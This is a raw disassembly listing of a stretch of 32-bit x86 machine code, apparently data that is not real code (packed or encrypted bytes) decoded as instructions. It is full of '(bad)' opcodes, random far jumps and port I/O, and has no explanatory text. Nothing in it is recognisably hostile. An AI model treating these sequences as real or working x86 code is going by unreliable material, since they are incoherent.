  428aeb:	sbb    ch,cl
  428aed:	call   0xd69f:0xdbd40af0
  428af4:	jecxz  0x428ac1
  428af6:	sbb    BYTE PTR [esp+edx*8+0x58],ah
  428afa:	clc    
  428afb:	jns    0x428aa8
  428afd:	test   DWORD PTR [ebx+eiz*4],ebx
  428b00:	mov    bl,0x3a
  428b02:	xor    ah,BYTE PTR [edx+esi*2+0x28889fa2]
  428b09:	jno    0x428a8f
  428b0b:	lods   al,BYTE PTR ds:[esi]
  428b0c:	cwde   
  428b0d:	fld    QWORD PTR [edi-0x5c]
  428b10:	out    0xa0,al
  428b12:	(bad)
  428b15:	push   esp
  428b16:	jge    0x428aec
  428b18:	retf   
  428b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b1a:	mov    eax,0x15e81ce6
  428b1f:	inc    ecx
  428b20:	daa    
  428b21:	sbb    eax,0xb59f3dcd
  428b26:	adc    esi,DWORD PTR [eax+eax*2-0x14ca0a3a]
  428b2d:	icebp  
  428b2e:	fsubr  DWORD PTR [eax]
  428b30:	jae    0x428bb0
  428b32:	aaa    
  428b33:	jp     0x428ba0
  428b35:	icebp  
  428b36:	and    edx,DWORD PTR [esi+0x34]
  428b39:	pusha  
  428b3a:	repz push es
  428b3c:	mov    ah,dh
  428b3e:	in     eax,dx
  428b3f:	adc    eax,edx
  428b41:	or     esi,DWORD PTR [edi+edx*2-0x77632e10]
  428b48:	jnp    0x428b4b
  428b4a:	dec    esp
  428b4b:	cmp    edx,esi
  428b4d:	cmovne esi,edi
  428b50:	xchg   BYTE PTR [ebx-0x2fd1cd76],ah
  428b56:	jmp    0x428bac
  428b58:	jbe    0x428b98
  428b5a:	ret    
  428b5b:	xchg   edi,eax
  428b5c:	pusha  
  428b5d:	add    al,0x9f
  428b5f:	fnstsw WORD PTR [edi-0x36]
  428b62:	sub    ebp,DWORD PTR [ecx-0x229fcd65]
  428b68:	sub    esi,DWORD PTR [ecx+0x36]
  428b6b:	and    DWORD PTR [esi-0x7],ecx
  428b6e:	mov    cl,0xec
  428b70:	add    ah,ch
  428b72:	test   al,0x25
  428b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b75:	push   ebx
  428b76:	or     eax,0x720fc3b5
  428b7b:	or     BYTE PTR [eax+esi*4+0x5dc87f97],ah
  428b82:	cs xchg edx,eax
  428b84:	mov    dh,0x47
  428b86:	add    DWORD PTR [ebx],ebx
  428b88:	push   esp
  428b89:	or     DWORD PTR [ebx-0x1b],eax
  428b8c:	aaa    
  428b8d:	ror    BYTE PTR [ecx],0x23
	...
  428bf4:	lds    edx,FWORD PTR [ebp-0x76]
  428bf7:	cli    
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x35bde446
  428c04:	push   esp
  428c05:	mov    bl,0x1
  428c07:	add    BYTE PTR [ecx+eax*1],al
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	ins    DWORD PTR es:[edi],dx
  428c0d:	push   cs
  428c0e:	scas   al,BYTE PTR es:[edi]
  428c0f:	or     ecx,DWORD PTR [ecx-0x46]
  428c12:	jbe    0x428c30
  428c14:	sbb    DWORD PTR [eax-0x1650f16a],eax
  428c1a:	cdq    
  428c1b:	mov    cl,0x85
  428c1d:	xchg   edi,eax
  428c1e:	mov    ah,0x1d
  428c20:	call   0x3da5:0xe0e35d05
  428c27:	bound  ebp,QWORD PTR [esi-0x55dab619]
  428c2d:	xchg   ebp,eax
  428c2e:	sbb    BYTE PTR [ebp+0x41],al
  428c31:	out    0x9c,eax
  428c33:	data16 cmc 
  428c35:	test   edi,edi
  428c37:	dec    ebp
  428c38:	pop    edx
  428c39:	std    
  428c3a:	ins    BYTE PTR es:[edi],dx
  428c3b:	sbb    ecx,DWORD PTR [ebx-0xc]
  428c3e:	out    dx,eax
  428c3f:	cmp    DWORD PTR [esi+0x3145556],esi
  428c45:	(bad)  
  428c46:	(bad)  
  428c47:	jmp    0xc5ea:0xfe1857a3
  428c4e:	enter  0x1bde,0xd6
  428c52:	xchg   DWORD PTR [eax],esi
  428c54:	inc    edi
  428c55:	into   
  428c56:	mov    esi,0x36808a37
  428c5b:	pusha  
  428c5c:	xchg   ebx,eax
  428c5d:	pop    es
  428c5e:	inc    edx
  428c5f:	lds    ecx,FWORD PTR [edx+0x502227a4]
  428c65:	ret    
  428c66:	addr16 add al,0x5b
  428c69:	sub    ebp,DWORD PTR [edi+0x9]
  428c6c:	int    0xb6
  428c6e:	mov    ecx,0x413fa746
  428c73:	cdq    
  428c74:	(bad)  
  428c75:	sar    BYTE PTR [ebp+ecx*1+0x15],0xe
  428c7a:	cmp    BYTE PTR [bx+0xd92],ah
  428c7f:	add    eax,0x5d80183f
  428c84:	dec    ebx
  428c85:	inc    eax
  428c86:	jmp    0x9627:0x787de3bf
  428c8d:	test   esi,ecx
  428c8f:	xchg   ebx,eax
  428c90:	setb   BYTE PTR [eax-0x76301d04]
  428c97:	mov    DWORD PTR [edx+0x44],0x88e43f63
  428c9e:	jecxz  0x428ca3
  428ca0:	aad    0x59
  428ca2:	loop   0x428ccc
  428ca4:	aas    
  428ca5:	pop    ds
  428ca6:	sbb    DWORD PTR [edi-0x6],eax
  428ca9:	ins    BYTE PTR es:[edi],dx
  428caa:	sub    eax,DWORD PTR [edi+0x47]
  428cad:	(bad)  
  428cae:	in     eax,0xce
  428cb0:	push   ds
  428cb1:	or     cl,BYTE PTR [ebp-0x64328594]
  428cb7:	push   ds
  428cb8:	cmp    eax,0x13c96321
  428cbd:	sbb    al,BYTE PTR [ebx-0x2c]
  428cc0:	lock rcl BYTE PTR es:[ebx-0x4f],1
  428cc5:	xor    ah,BYTE PTR [ebp-0x3e48976e]
  428ccb:	xor    DWORD PTR [ebx],edx
  428ccd:	jnp    0x428c6c
  428ccf:	and    eax,ebp
  428cd1:	in     eax,0xcd
  428cd3:	(bad)  
  428cd4:	adc    bh,dl
  428cd6:	int    0x54
  428cd8:	mov    bl,0x7
  428cda:	jnp    0x428ce4
  428cdc:	pop    es
  428cdd:	test   eax,0x4f324377
  428ce2:	mov    ?,WORD PTR [edi+0x29]
  428ce5:	ret    0x121e
  428ce8:	aam    0x10
  428cea:	mov    ah,0x6
  428cec:	mov    edi,0x76513c67
  428cf1:	jg     0x428ca1
  428cf3:	ror    DWORD PTR [edx+0x5f],1
  428cf6:	cmp    al,0xf8
  428cf8:	mov    ds:0x222bca16,eax
  428cfd:	loope  0x428caf
  428cff:	leave  
  428d00:	inc    edi
  428d01:	push   ss
  428d02:	stos   BYTE PTR es:[edi],al
  428d03:	and    DWORD PTR [esi-0x3abe7aec],ecx
  428d09:	popaw  
  428d0b:	test   eax,0x778846b4
	...
  428d74:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0xaf15
  428d82:	adc    eax,0x1b45888
  428d87:	add    BYTE PTR [ecx+eax*1],al
  428d8a:	add    BYTE PTR [eax],al
  428d8c:	sbb    DWORD PTR [edi+0x3d],ebx
  428d8f:	adc    ecx,DWORD PTR ds:0xd9838aaa
  428d95:	xchg   ebp,eax
  428d96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428d97:	cmp    DWORD PTR [edx],edx
  428d99:	sbb    ch,al
  428d9b:	push   0xc5208f55
  428da0:	shl    BYTE PTR [esi],1
  428da2:	inc    esi
  428da3:	push   edx
  428da4:	mov    dh,0xfa
  428da6:	ins    BYTE PTR es:[edi],dx
  428da7:	sub    eax,0xc8b9c8a4
  428dac:	pushf  
  428dad:	fiadd  DWORD PTR [ebx]
  428daf:	leave  
  428db0:	add    ebp,edx
  428db2:	mov    dh,BYTE PTR [esi]
  428db4:	dec    ebp
  428db5:	sub    edi,DWORD PTR [ecx-0x28]
  428db8:	cdq    
  428db9:	call   0x33e7:0xbbcecaf5
  428dc0:	aad    0x2e
  428dc2:	cdq    
  428dc3:	bound  ebx,QWORD PTR [edx-0x20c881a5]
  428dc9:	int    0xb0
  428dcb:	jbe    0x428dbb
  428dcd:	jg     0x428deb
  428dcf:	inc    esp
  428dd0:	cmp    DWORD PTR [eax-0x6c],edi
  428dd3:	std    
  428dd4:	(bad)  [eax-0x4f805140]
  428dda:	cli    
  428ddb:	mov    esi,0xac4b2ac
  428de0:	call   0xab10c53f
  428de5:	push   ecx
  428de6:	ds push ds
  428de8:	call   0x782a:0x79118aa2
  428def:	xchg   esp,eax
  428df0:	xor    eax,0x7ee7d61e
  428df5:	rol    BYTE PTR [edi+0x402a2099],cl
  428dfb:	xchg   esp,eax
  428dfc:	mov    ds:0x28174ef7,eax
  428e01:	or     al,BYTE PTR [edi+esi*1]
  428e04:	int3   
  428e05:	xchg   dl,dh
  428e07:	inc    ebp
  428e08:	cmp    DWORD PTR [eax],ebx
  428e0a:	fwait
  428e0b:	test   al,cl
  428e0d:	ins    BYTE PTR es:[edi],dx
  428e0e:	inc    ecx
  428e0f:	sahf   
  428e10:	mov    al,0x40
  428e13:	pop    edx
  428e14:	aaa    
  428e15:	mov    esp,DWORD PTR [ebx+0x4b4be84a]
  428e1b:	mov    dh,0x65
  428e1d:	sub    DWORD PTR [ebx-0x4f],0x85a7c5b4
  428e24:	jno    0x428e24
  428e26:	fistp  DWORD PTR [ebp+0x75445bfa]
  428e2c:	aas    
  428e2d:	mov    ah,0x76
  428e2f:	adc    ah,0x47
  428e32:	rcr    DWORD PTR [edi-0x13],0xe0
  428e36:	(bad)  
  428e37:	js     0x428def
  428e39:	int3   
  428e3a:	cld    
  428e3b:	dec    esi
  428e3c:	cmp    eax,0x352b144b
  428e41:	pop    edi
  428e42:	jp     0x428e1f
  428e44:	shl    DWORD PTR [ecx-0x7],cl
  428e47:	mov    edi,edi
  428e49:	sbb    BYTE PTR [eax+0x33],dl
  428e4c:	aam    0xc5
  428e4e:	pop    ds
  428e4f:	dec    esi
  428e50:	adc    eax,0x74dfe567
  428e55:	fst    QWORD PTR [edx]
  428e57:	cmp    eax,0xa8aa3e5e
  428e5c:	ins    DWORD PTR es:[edi],dx
  428e5d:	in     al,dx
  428e5e:	ret    
  428e5f:	nop
  428e60:	in     al,dx
  428e61:	cmc    
  428e62:	hlt    
  428e63:	cmc    
  428e64:	sbb    al,0xa6
  428e66:	and    ecx,eax
  428e68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e69:	xchg   edi,eax
  428e6a:	adc    DWORD PTR [ebx-0x4dd4d8a],eax
  428e70:	cwde   
  428e71:	daa    
  428e72:	jmp    0x7e1d:0x96bdd9cc
  428e79:	push   ebp
  428e7a:	mov    eax,0xf08ece09
  428e7f:	retf   0x42bd
  428e82:	xchg   ebp,eax
  428e83:	sub    bl,BYTE PTR [edx+0x7e]
  428e86:	pop    ss
  428e87:	mov    dh,0x2c
  428e89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e8a:	ds and al,0xa8
  428e8d:	mov    bl,0x1a
  428e8f:	jmp    0x0:0x0
	...
  428ef2:	add    BYTE PTR [eax],al
  428ef4:	dec    edi
  428ef5:	pop    ebp
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x31
  428f01:	mul    BYTE PTR [ebx+0x1b55c74]
  428f07:	add    BYTE PTR [ecx+eax*1],al
  428f0a:	add    BYTE PTR [eax],al
  428f0c:	jb     0x428f07
  428f0e:	xor    BYTE PTR cs:[eax],0x5d
  428f12:	into   
  428f13:	test   eax,0xf04c4d0f
  428f18:	out    dx,al
  428f19:	lock pushf 
  428f1b:	adc    eax,DWORD PTR [ecx]
  428f1d:	jno    0x428f17
  428f1f:	(bad)  
  428f20:	jae    0x428f83
  428f22:	lock ret 
  428f24:	or     eax,0x284abf88
  428f29:	pop    ecx
  428f2a:	imul   ecx,DWORD PTR [ecx],0xac3ac798
  428f30:	mov    ?,WORD PTR [edi-0x4c]
  428f33:	fs (bad) 
  428f36:	dec    ebp
  428f37:	popa   
  428f38:	fimul  DWORD PTR [eax+0x49bb692d]
  428f3e:	add    cl,BYTE PTR [edx+eax*8-0x6e3bc368]
  428f45:	fdivr  DWORD PTR [esi-0x17]
  428f48:	add    dh,dh
  428f4a:	test   DWORD PTR [ebx-0x3e7c9340],edx
  428f50:	or     eax,0xb0b39d5d
  428f55:	jnp    0x428f55
  428f57:	adc    DWORD PTR [ebx],eax
  428f59:	outs   dx,BYTE PTR ds:[esi]
  428f5a:	retf   
  428f5b:	xor    ebp,DWORD PTR ds:0x8a57aa41
  428f61:	jb     0x428fce
  428f63:	adc    al,al
  428f65:	aam    0xdf
  428f67:	mov    al,ds:0xdfda3cbc
  428f6c:	mov    edx,0xaba88c2f
  428f71:	retf   0x9179
  428f74:	lock les esi,FWORD PTR [ebx-0x5d8eadf0]
  428f7b:	jecxz  0x428ff7
  428f7d:	mov    edx,0x634635fa
  428f82:	pusha  
  428f83:	mov    ch,0xac
  428f85:	xchg   ecx,eax
  428f86:	add    ebx,eax
  428f88:	int    0x3b
  428f8a:	and    edx,DWORD PTR [eax+0x73]
  428f8d:	dec    edi
  428f8e:	or     al,0xef
  428f90:	(bad)  [ebx+esi*1]
  428f93:	xchg   ebp,eax
  428f94:	sbb    al,BYTE PTR [esp+ecx*1+0x7579722c]
  428f9b:	dec    esi
  428f9c:	pushf  
  428f9d:	and    esp,ebx
  428f9f:	out    dx,eax
  428fa0:	sbb    edi,DWORD PTR [edx-0x7fded5bb]
  428fa6:	js     0x428f6d
  428fa8:	aas    
  428fa9:	repnz mov al,ds:0xb8a6cbac
  428faf:	cwde   
  428fb0:	or     eax,0x11b87d82
  428fb5:	pop    edx
  428fb6:	in     al,dx
  428fb7:	and    al,0xa2
  428fb9:	or     dl,BYTE PTR [edx]
  428fbb:	push   edx
  428fbc:	imul   edx,esp,0xffffffbd
  428fbf:	inc    esp
  428fc0:	dec    ebp
  428fc1:	retf   
  428fc2:	inc    eax
  428fc3:	or     bh,BYTE PTR [ebp-0x2adde8c7]
  428fc9:	mov    eax,ds:0xfc007481
  428fce:	sbb    ebp,DWORD PTR [esi+0x2]
  428fd1:	pop    es
  428fd2:	dec    ebp
  428fd3:	xor    esi,0x106428cd
  428fd9:	adc    ebp,ebp
  428fdb:	inc    esp
  428fdc:	jae    0x429050
  428fde:	xchg   ecx,eax
  428fdf:	lods   al,BYTE PTR ds:[esi]
  428fe0:	retf   
  428fe1:	data16 xchg BYTE PTR [edx+0x36],al
  428fe5:	pop    ebp
  428fe6:	jno    0x429022
  428fe8:	outs   dx,DWORD PTR ds:[esi]
  428fe9:	data16 fmul QWORD PTR fs:[edx]
  428fed:	jp     0x428f9d
  428fef:	xchg   ebx,eax
  428ff0:	sbb    al,0xc5
  428ff2:	pop    eax
  428ff3:	shl    DWORD PTR [esi+0x153a5d75],cl
  428ff9:	lahf   
  428ffa:	lods   al,BYTE PTR ds:[esi]
  428ffb:	cmc    
  428ffc:	test   BYTE PTR [ebx],0xa7
  428fff:	pop    eax
  429000:	push   ds
  429001:	jmp    0x7b0dd83f
  429006:	ror    DWORD PTR [ecx-0x6ee45f],1
  42900c:	call   0x9b2405
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x26fc7b77
  429081:	ror    BYTE PTR [ecx+ecx*4+0x60],0xb6
  429086:	add    DWORD PTR [eax],eax
  429088:	add    al,0x1
  42908a:	add    BYTE PTR [eax],al
  42908c:	pop    edi
  42908d:	imul   edi,DWORD PTR [esp+edx*1],0xffffff91
  429091:	sbb    eax,DWORD PTR [edx+0x4d]
  429094:	popa   
  429095:	mov    bh,0x31
  429097:	repz inc eax
  429099:	add    eax,esi
  42909b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42909c:	(bad)  
  42909d:	imul   ebp,DWORD PTR [ebp-0x52],0xddd787ec
  4290a4:	shl    DWORD PTR [edi-0x80],0xf8
  4290a8:	ja     0x4290ac
  4290aa:	leave  
  4290ab:	popa   
  4290ac:	minps  xmm6,xmm2
  4290af:	(bad)  
  4290b0:	sahf   
  4290b1:	jnp    0x42911a
  4290b3:	test   ecx,ebx
  4290b5:	int    0x7d
  4290b7:	sti    
  4290b8:	ret    0xd219
  4290bb:	fs sbb al,0xed
  4290be:	shl    DWORD PTR [ecx],cl
  4290c0:	mov    ecx,0xee2f2cc
  4290c5:	je     0x429138
  4290c7:	push   0x7a9948d4
  4290cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4290cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4290ce:	call   0x81c:0xe1a10487
  4290d5:	test   al,0xdf
  4290d7:	or     esi,ebp
  4290d9:	push   edi
  4290da:	movq   QWORD PTR [esi-0x1b],mm7
  4290de:	cli    
  4290df:	rol    DWORD PTR [eax-0x5051b1eb],0xa8
  4290e6:	daa    
  4290e7:	ss inc ecx
  4290e9:	repz out dx,eax
  4290eb:	bound  ecx,QWORD PTR [edx]
  4290ed:	(bad)  
  4290ef:	push   ebp
  4290f0:	inc    esi
  4290f1:	fcmovb st,st(0)
  4290f3:	mov    dh,0x1e
  4290f5:	ins    DWORD PTR es:[edi],dx
  4290f6:	bound  ecx,QWORD PTR ds:0x9deb19f3
  4290fc:	add    BYTE PTR [edx],bl
  4290fe:	or     esi,DWORD PTR [edi-0x584178f3]
  429104:	in     al,dx
  429105:	jne    0x42915b
  429107:	jnp    0x429117
  429109:	pop    ds
  42910a:	fst    QWORD PTR [ebp-0x34a85958]
  429110:	jne    0x429099
  429112:	pushf  
  429113:	cld    
  429114:	scas   eax,DWORD PTR es:[edi]
  429115:	jnp    0x4290a9
  429117:	das    
  429118:	fs das 
  42911a:	call   FWORD PTR [edi-0x212680a4]
  429120:	nop
  429121:	(bad)  
  429123:	inc    edi
  429124:	repnz push 0xc0b9a6c0
  42912a:	cmc    
  42912b:	add    DWORD PTR [eax+0x24092a8],ecx
  429131:	mov    WORD PTR [edx+0xe87270d],ss
  429137:	mov    dl,0x80
  429139:	ins    DWORD PTR es:[edi],dx
  42913a:	jl     0x4290f0
  42913c:	cmp    esp,DWORD PTR [ebx-0x393dd90d]
  429142:	leave  
  429143:	clc    
  429144:	aas    
  429145:	fsubp  st(1),st
  429147:	inc    ebx
  429148:	sbb    al,0x2a
  42914a:	das    
  42914b:	fdivr  DWORD PTR [edx+0x1042c224]
  429151:	iret   
  429152:	add    bh,BYTE PTR [eiz*8-0x52c195c7]
  429159:	jmp    0x4290df
  42915b:	(bad)  
  42915c:	rol    dl,1
  42915e:	imul   ebx,DWORD PTR [esi+edx*4+0x51],0xaedf7aa1
  429166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429167:	ror    BYTE PTR [ebx],0x85
  42916a:	push   es
  42916b:	daa    
  42916c:	retf   
  42916d:	mov    ebp,0xc85699e9
  429172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429173:	push   0x52
  429175:	mul    BYTE PTR [edx]
  429177:	lfs    ebp,FWORD PTR [eax+0x6b]
  42917b:	addr16 lahf 
  42917d:	loop   0x429171
  42917f:	test   eax,0x82a35651
  429184:	or     BYTE PTR [eax+0x2a],dl
  429187:	and    ecx,edx
  429189:	nop
  42918a:	inc    eax
  42918b:	mov    al,0x52
  42918d:	stos   DWORD PTR es:[edi],eax
  42918e:	xor    al,0xe6
	...
  4291f4:	push   esi
  4291f5:	xchg   ebp,edi
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [ebp+edx*1+0x643f73ca],0x40001b7
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [edx-0xc],ah
  42920e:	jmp    0x1c8672e9
  429213:	inc    edi
  429214:	pop    ebp
  429215:	out    0x49,al
  429217:	out    0x8b,al
  429219:	enter  0x34a3,0x51
  42921d:	xchg   DWORD PTR [eax-0x22ef3b05],ebp
  429223:	mov    ebp,0x8c0c7e35
  429228:	lods   al,BYTE PTR ds:[esi]
  429229:	jge    0x42920b
  42922b:	mov    ebp,0xf586bcc0
  429230:	pop    es
  429231:	retf   
  429232:	jecxz  0x4291de
  429234:	stc    
  429235:	sub    dh,BYTE PTR [ebp+0x10e6be30]
  42923b:	cmp    ecx,edx
  42923d:	in     eax,dx
  42923e:	repz inc eax
  429240:	xchg   ebx,eax
  429241:	xchg   ecx,eax
  429242:	lea    eax,[ecx+eax*8-0x76]
  429246:	push   edx
  429247:	inc    ebp
  429248:	loope  0x429299
  42924a:	test   BYTE PTR [ebx-0x66a329b],dl
  429250:	xchg   DWORD PTR [edx+0x11],esi
  429253:	adc    al,al
  429255:	jl     0x429228
  429257:	cdq    
  429258:	mov    esi,DWORD PTR [ebp-0x56]
  42925b:	jbe    0x429256
  42925d:	xlat   BYTE PTR ds:[ebx]
  42925e:	out    dx,al
  42925f:	or     al,0x8c
  429261:	sbb    DWORD PTR [esi-0x39],ebx
  429264:	cwde   
  429265:	adc    eax,DWORD PTR [edx-0x6c]
  429268:	and    dl,dh
  42926a:	mov    ebp,0xf8e0a057
  42926f:	repnz outs dx,DWORD PTR ds:[esi]
  429271:	aas    
  429272:	std    
  429273:	out    dx,eax
  429274:	int3   
  429275:	loop   0x4292a2
  429277:	(bad)  
  429278:	outs   dx,BYTE PTR ds:[esi]
  429279:	xchg   edx,eax
  42927a:	aad    0xb0
  42927c:	pop    esp
  42927d:	cmp    al,0xf2
  42927f:	push   es
  429280:	sti    
  429281:	cmp    DWORD PTR [ebp-0x7c],esi
  429284:	shl    DWORD PTR [eax+0x33],0x65
  429288:	sbb    bl,BYTE PTR [esi+0x55d48873]
  42928e:	jp     0x429263
  429290:	jle    0x429280
  429292:	xchg   edi,eax
  429293:	ins    DWORD PTR es:[edi],dx
  429294:	cs jl  0x42928b
  429297:	out    dx,al
  429298:	jns    0x429314
  42929a:	xchg   esi,eax
  42929b:	jns    0x429246
  42929d:	sub    eax,0xa75d6505
  4292a2:	mov    dl,0xa1
  4292a4:	dec    esi
  4292a5:	scas   al,BYTE PTR es:[edi]
  4292a6:	repnz lds esp,FWORD PTR [edx+0x45]
  4292aa:	stos   BYTE PTR es:[edi],al
  4292ab:	adc    edi,ecx
  4292ad:	cmp    eax,0x90f88b56
  4292b2:	or     ch,BYTE PTR [ebp-0x4fe327c3]
  4292b8:	clc    
  4292b9:	call   0xcf465675
  4292be:	jmp    0x4292a9
  4292c0:	or     BYTE PTR [esi-0x1e],bh
  4292c3:	loop   0x429304
  4292c5:	jecxz  0x4292cb
  4292c7:	sar    BYTE PTR [eax-0x432ee470],cl
  4292cd:	dec    ebp
  4292ce:	xchg   edi,eax
  4292cf:	add    edi,esi
  4292d1:	jecxz  0x4292d5
  4292d3:	(bad)  
  4292d4:	dec    edx
  4292d5:	push   ss
  4292d6:	jge    0x429357
  4292d8:	jl     0x42930a
  4292da:	ror    BYTE PTR [ecx],1
  4292dc:	adc    eax,0x28d93fe9
  4292e1:	rcr    DWORD PTR [edi-0x5b],cl
  4292e4:	ins    BYTE PTR es:[edi],dx
  4292e5:	pop    ebp
  4292e6:	xchg   ebx,eax
  4292e7:	fadd   QWORD PTR [edx-0x6ec310de]
  4292ed:	cmc    
  4292ee:	cmp    DWORD PTR [ebx],edx
  4292f0:	call   0x95cf:0xc38357fe
  4292f7:	sbb    DWORD PTR [ebx],ebx
  4292f9:	fcmovnb st,st(3)
  4292fb:	or     BYTE PTR [ebx],dl
  4292fd:	clc    
  4292fe:	stos   DWORD PTR es:[edi],eax
  4292ff:	mov    ds:0x3e8ecef0,eax
  429304:	inc    edi
  429305:	and    DWORD PTR [ebx+0x23a9f223],esi
  42930b:	xor    BYTE PTR [ebx+0x76c370],cl
	...
  429371:	add    BYTE PTR [eax],al
  429373:	add    al,dh
  429375:	adc    al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0xc3
  429381:	and    al,0x0
  429383:	nop
  429384:	push   0x40001b8
  429389:	add    DWORD PTR [eax],eax
  42938b:	add    BYTE PTR [edx-0x7d],bl
  42938e:	push   0x32
  429390:	shl    DWORD PTR [edx+0x3ec19ae7],cl
  429396:	adc    cl,BYTE PTR [esi+0x37]
  429399:	repz fcomp DWORD PTR [eax-0x65e220b7]
  4293a0:	mov    ecx,0x43e3c3b9
  4293a5:	cmp    al,0x67
  4293a7:	xor    esp,ebp
  4293a9:	push   edi
  4293aa:	cmp    esi,edi
  4293ac:	xor    ebx,DWORD PTR [esi-0x5f]
  4293af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4293b0:	ds mov ebp,0xe68a013a
  4293b6:	retf   0x9915
  4293b9:	(bad)  
  4293bb:	lock jmp 0x2c86eab6
  4293c1:	sbb    al,0xf2
  4293c3:	aam    0x41
  4293c5:	xor    BYTE PTR [eax],bh
  4293c7:	sub    DWORD PTR [eax],eax
  4293c9:	(bad)  
  4293ca:	into   
  4293cb:	fldcw  WORD PTR [ecx]
  4293cd:	fs pop ecx
  4293cf:	xchg   esp,edi
  4293d1:	xor    edx,esi
  4293d3:	imul   DWORD PTR [edx]
  4293d5:	sub    DWORD PTR [edx-0x686e9f6f],ebx
  4293db:	adc    al,0x12
  4293dd:	adc    dl,BYTE PTR [edx-0x14]
  4293e0:	les    ebp,FWORD PTR [ecx+esi*4-0xdb4bfd7]
  4293e7:	add    edx,DWORD PTR [ecx+ecx*8+0x6e]
  4293eb:	mov    esp,0x50cd1d63
  4293f0:	inc    ebx
  4293f1:	daa    
  4293f2:	push   cs
  4293f3:	retf   
  4293f4:	sbb    edx,DWORD PTR [ecx-0x1c]
  4293f7:	mov    ah,ch
  4293f9:	pop    edi
  4293fa:	mov    ebx,0x5e05f374
  4293ff:	push   esi
  429400:	adc    DWORD PTR [ecx+edi*2-0x30c0044b],ebx
  429407:	pusha  
  429408:	in     al,0x15
  42940a:	and    ch,BYTE PTR [edx]
  42940c:	xor    dh,BYTE PTR [ecx]
  42940e:	or     eax,0x6cd80395
  429413:	call   DWORD PTR [ebx+ebp*1+0x6eeb88ac]
  42941a:	push   ss
  42941b:	into   
  42941c:	inc    edi
  42941d:	es stos DWORD PTR es:[edi],eax
  42941f:	stos   DWORD PTR es:[edi],eax
  429420:	xor    al,0x12
  429422:	cmc    
  429423:	xchg   ebx,eax
  429424:	lods   eax,DWORD PTR ds:[esi]
  429425:	cld    
  429426:	jp     0x42948b
  429428:	mov    ecx,0x8369e215
  42942d:	lods   al,BYTE PTR ds:[esi]
  42942e:	mov    ah,0x6f
  429430:	or     DWORD PTR [edi+0x27],0xe48a82b4
  429437:	push   esi
  429438:	clc    
  429439:	inc    ebp
  42943a:	bswap  esp
  42943c:	ds popa 
  42943e:	rcr    DWORD PTR [ebx],cl
  429440:	mov    WORD PTR [esi-0x60a8f7e3],ds
  429446:	jmp    0x4294c7
  429448:	sahf   
  429449:	pop    edx
  42944a:	dec    eax
  42944b:	dec    esp
  42944c:	and    al,BYTE PTR [edi+edx*2-0x51]
  429450:	test   eax,0x6b13c37f
  429455:	call   0x5157:0xa7c1a4c1
  42945c:	adc    al,0x79
  42945e:	iret   
  42945f:	mov    dl,0xaa
  429461:	cmp    BYTE PTR [edi-0x54],ch
  429464:	shr    BYTE PTR [ebx],1
  429466:	bound  ecx,QWORD PTR [esi+0xf]
  429469:	push   ss
  42946a:	pop    ebx
  42946b:	sbb    esp,eax
  42946d:	mov    ds:0x8f63fceb,eax
  429472:	cmc    
  429473:	aad    0xd2
  429475:	dec    esp
  429476:	cs adc dl,dh
  429479:	pop    edi
  42947a:	pop    edx
  42947b:	cmp    DWORD PTR ds:0x4fc11fa4,eax
  429481:	mov    cl,BYTE PTR [edi]
  429483:	adc    esp,DWORD PTR [edx]
  429485:	in     eax,dx
  429486:	int3   
  429487:	fs out dx,al
  429489:	idiv   DWORD PTR [edi-0x6e5ce8f0]
  42948f:	int    0x0
	...
  4294f1:	add    BYTE PTR [eax],al
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x70b855ea],dx
  429503:	call   0x444e74
  429508:	add    al,0x1
  42950a:	add    BYTE PTR [eax],al
  42950c:	mov    ?,eax
  42950e:	mov    eax,ecx
  429510:	mov    ebp,0x8ee8b073
  429515:	mov    eax,0x444266b4
  42951a:	sbb    ax,0x633c
  42951e:	xchg   edi,eax
  42951f:	jb     0x429590
  429521:	stos   BYTE PTR es:[edi],al
  429522:	push   es
  429523:	xor    edx,edi
  429525:	test   DWORD PTR [ebp-0x5e],esi
  429528:	jge    0x4294d7
  42952a:	lock pop ebx
  42952c:	pop    ebx
  42952d:	push   esi
  42952e:	pushf  
  42952f:	mov    al,BYTE PTR [esi-0x175f1f77]
  429535:	mov    bh,0xc7
  429537:	ss mov bl,0x43
  42953a:	mov    ?,WORD PTR [esi+0x1d]
  42953d:	out    dx,eax
  42953e:	push   ecx
  42953f:	jae    0x429595
  429541:	mov    gs,ebp
  429543:	pop    esp
  429544:	int    0x0
  429546:	jmp    0x429598
  429548:	mov    ds:0x3148f1ee,al
  42954d:	xor    al,0xc2
  42954f:	aaa    
  429550:	ss out 0x4d,eax
  429553:	in     eax,0xc7
  429555:	ja     0x429536
  429557:	(bad)  
  429559:	mov    esi,0x854e0b7c
